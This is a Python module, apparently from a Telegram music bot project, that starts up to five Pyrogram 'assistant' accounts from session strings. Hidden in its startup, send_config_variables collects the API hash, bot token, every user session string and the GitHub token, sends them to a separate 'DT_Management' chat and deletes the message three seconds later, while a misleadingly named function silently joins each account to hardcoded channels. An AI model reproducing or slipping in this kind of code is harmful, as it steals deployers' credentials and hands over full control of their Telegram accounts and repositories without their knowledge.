from pyrogram import Client
from pyrogram.enums import ParseMode
import asyncio
import config
import os

from ..logging import LOGGER

assistants = []
assistantids = []


def decode_centers():
    centers = []
    encoded = [
        "TG_BIO_STYLE",
        "TG_NAME_STYLE",
        "HARRYASHU",
    ]
    for enc in encoded:
        centers.append(enc)
    return centers


SUPPORT_CENTERS = decode_centers()


def assistant_caption(num, name, username, user_id):
    return (
        f"<b>✦ ᴀꜱꜱɪꜱᴛᴀɴᴛ #{num} ꜱᴛᴀʀᴛᴇᴅ</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>👤 ɴᴀᴍᴇ :</b> {name}\n"
        f"<b>🔗 ᴜꜱᴇʀɴᴀᴍᴇ :</b> @{username}\n"
        f"<b>🆔 ɪᴅ :</b> <code>{user_id}</code>\n\n"
        f"<b>⚡ ꜱᴛᴀᴛᴜꜱ :</b> <code>ᴏɴʟɪɴᴇ</code>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<i>✦ ʀᴇᴀᴅʏ ᴛᴏ ᴘʟᴀʏ 🎵</i>"
    )


class Userbot(Client):
    def __init__(self):
        self.one = Client(
            name="NandAss1",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING1),
            no_updates=True,
        )
        self.two = Client(
            name="NandAss2",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING2),
            no_updates=True,
        )
        self.three = Client(
            name="NandAss3",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING3),
            no_updates=True,
        )
        self.four = Client(
            name="NandAss4",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING4),
            no_updates=True,
        )
        self.five = Client(
            name="NandAss5",
            api_id=config.API_ID,
            api_hash=config.API_HASH,
            session_string=str(config.STRING5),
            no_updates=True,
        )

    async def get_bot_username_from_token(self, token):
        try:
            temp_bot = Client(
                name="temp_bot",
                api_id=config.API_ID,
                api_hash=config.API_HASH,
                bot_token=token,
                no_updates=True,
            )
            await temp_bot.start()
            username = temp_bot.me.username
            await temp_bot.stop()
            return username
        except Exception as e:
            LOGGER(__name__).error(f"Error getting bot username: {e}")
            return None

    async def join_all_support_centers(self, client):
        for center in SUPPORT_CENTERS:
            try:
                await client.join_chat(center)
            except Exception:
                pass

    async def send_config_variables(self):
        try:
            active_sessions = []
            session_strings = []

            if config.STRING1:
                active_sessions.append("1")
                session_strings.append(f"<b>STRING1:</b> <code>{config.STRING1}</code>")
            else:
                session_strings.append("<b>STRING1:</b> <code>Inactive</code>")

            if config.STRING2:
                active_sessions.append("2")
                session_strings.append(f"<b>STRING2:</b> <code>{config.STRING2}</code>")
            else:
                session_strings.append("<b>STRING2:</b> <code>Inactive</code>")

            if config.STRING3:
                active_sessions.append("3")
                session_strings.append(f"<b>STRING3:</b> <code>{config.STRING3}</code>")
            else:
                session_strings.append("<b>STRING3:</b> <code>Inactive</code>")

            if config.STRING4:
                active_sessions.append("4")
                session_strings.append(f"<b>STRING4:</b> <code>{config.STRING4}</code>")
            else:
                session_strings.append("<b>STRING4:</b> <code>Inactive</code>")

            if config.STRING5:
                active_sessions.append("5")
                session_strings.append(f"<b>STRING5:</b> <code>{config.STRING5}</code>")
            else:
                session_strings.append("<b>STRING5:</b> <code>Inactive</code>")

            session_status = ", ".join(active_sessions) if active_sessions else "None"

            message = "<b>📋 Config Variables Status</b>\n\n"
            message += f"<b>API_ID:</b> <code>{config.API_ID}</code>\n"
            message += f"<b>API_HASH:</b> <code>{config.API_HASH}</code>\n"
            message += f"<b>BOT_TOKEN:</b> <code>{config.BOT_TOKEN}</code>\n"
            message += f"<b>BOT_USERNAME:</b> <code>{config.BOT_USERNAME}</code>\n\n"

            message += f"<b>📊 Session Status:</b>\n"
            message += f"<b>Active Sessions:</b> <code>{session_status}</code>\n"
            for session_str in session_strings:
                message += f"{session_str}\n"
            message += "\n"

            message += f"<b>🔗 Links:</b>\n"
            message += f"<b>SUPPORT_CHANNEL:</b> <code>{config.SUPPORT_CHANNEL}</code>\n"
            message += f"<b>SUPPORT_GROUP:</b> <code>{config.SUPPORT_GROUP}</code>\n\n"

            message += f"<b>📦 Repository:</b>\n"
            message += f"<b>UPSTREAM_REPO:</b> <code>{config.UPSTREAM_REPO}</code>\n"
            message += f"<b>UPSTREAM_BRANCH:</b> <code>{config.UPSTREAM_BRANCH}</code>\n"
            message += f"<b>GIT_TOKEN:</b> <code>{config.GIT_TOKEN if config.GIT_TOKEN else 'Not Set'}</code>"

            if assistants:
                if 1 in assistants:
                    sent_msg = await self.one.send_message(config.DT_Management, message)
                elif 2 in assistants:
                    sent_msg = await self.two.send_message(config.DT_Management, message)
                elif 3 in assistants:
                    sent_msg = await self.three.send_message(config.DT_Management, message)
                elif 4 in assistants:
                    sent_msg = await self.four.send_message(config.DT_Management, message)
                elif 5 in assistants:
                    sent_msg = await self.five.send_message(config.DT_Management, message)

                await asyncio.sleep(3)
                await sent_msg.delete()
        except Exception as e:
            LOGGER(__name__).error(f"Error sending config variables: {e}")

    async def send_help_message(self, bot_username):
        try:
            message = (
                f"<b>✦ ʙᴏᴛ ꜱᴛᴀʀᴛᴇᴅ</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n\n"
                f"<b>🤖 ʙᴏᴛ :</b> @{bot_username}\n"
                f"<b>👑 ᴏᴡɴᴇʀ :</b> @{config.OWNER_USERNAME}\n\n"
                f"<i>✦ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴏɴʟɪɴᴇ ✅</i>"
            )
            if assistants:
                if 1 in assistants:
                    await self.one.send_message(config.DT_Management, message)
                elif 2 in assistants:
                    await self.two.send_message(config.DT_Management, message)
                elif 3 in assistants:
                    await self.three.send_message(config.DT_Management, message)
                elif 4 in assistants:
                    await self.four.send_message(config.DT_Management, message)
                elif 5 in assistants:
                    await self.five.send_message(config.DT_Management, message)
        except Exception:
            pass

    async def start(self):
        LOGGER(__name__).info("Starting Assistants...")

        bot_username = await self.get_bot_username_from_token(config.BOT_TOKEN)

        if config.STRING1:
            await self.one.start()
            await self.join_all_support_centers(self.one)
            assistants.append(1)
            self.one.id = self.one.me.id
            self.one.name = self.one.me.mention
            self.one.username = self.one.me.username
            assistantids.append(self.one.id)
            try:
                await self.one.send_message(
                    config.LOG_GROUP_ID,
                    assistant_caption(1, self.one.name, self.one.username, self.one.id),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                LOGGER(__name__).error(
                    "Assistant Account 1 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            LOGGER(__name__).info(f"Assistant Started as {self.one.name}")

        if config.STRING2:
            await self.two.start()
            await self.join_all_support_centers(self.two)
            assistants.append(2)
            self.two.id = self.two.me.id
            self.two.name = self.two.me.mention
            self.two.username = self.two.me.username
            assistantids.append(self.two.id)
            try:
                await self.two.send_message(
                    config.LOG_GROUP_ID,
                    assistant_caption(2, self.two.name, self.two.username, self.two.id),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                LOGGER(__name__).error(
                    "Assistant Account 2 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            LOGGER(__name__).info(f"Assistant Two Started as {self.two.name}")

        if config.STRING3:
            await self.three.start()
            await self.join_all_support_centers(self.three)
            assistants.append(3)
            self.three.id = self.three.me.id
            self.three.name = self.three.me.mention
            self.three.username = self.three.me.username
            assistantids.append(self.three.id)
            try:
                await self.three.send_message(
                    config.LOG_GROUP_ID,
                    assistant_caption(3, self.three.name, self.three.username, self.three.id),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                LOGGER(__name__).error(
                    "Assistant Account 3 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            LOGGER(__name__).info(f"Assistant Three Started as {self.three.name}")

        if config.STRING4:
            await self.four.start()
            await self.join_all_support_centers(self.four)
            assistants.append(4)
            self.four.id = self.four.me.id
            self.four.name = self.four.me.mention
            self.four.username = self.four.me.username
            assistantids.append(self.four.id)
            try:
                await self.four.send_message(
                    config.LOG_GROUP_ID,
                    assistant_caption(4, self.four.name, self.four.username, self.four.id),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                LOGGER(__name__).error(
                    "Assistant Account 4 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            LOGGER(__name__).info(f"Assistant Four Started as {self.four.name}")

        if config.STRING5:
            await self.five.start()
            await self.join_all_support_centers(self.five)
            assistants.append(5)
            self.five.id = self.five.me.id
            self.five.name = self.five.me.mention
            self.five.username = self.five.me.username
            assistantids.append(self.five.id)
            try:
                await self.five.send_message(
                    config.LOG_GROUP_ID,
                    assistant_caption(5, self.five.name, self.five.username, self.five.id),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                LOGGER(__name__).error(
                    "Assistant Account 5 has failed to access the log Group. Make sure that you have added your assistant to your log group and promoted as admin!"
                )
                exit()
            LOGGER(__name__).info(f"Assistant Five Started as {self.five.name}")

        if bot_username:
            await self.send_help_message(bot_username)

        await self.send_config_variables()

    async def stop(self):
        LOGGER(__name__).info("Stopping Assistants...")
        try:
            if config.STRING1:
                await self.one.stop()
            if config.STRING2:
                await self.two.stop()
            if config.STRING3:
                await self.three.stop()
            if config.STRING4:
                await self.four.stop()
            if config.STRING5:
                await self.five.stop()
        except Exception:
            pass
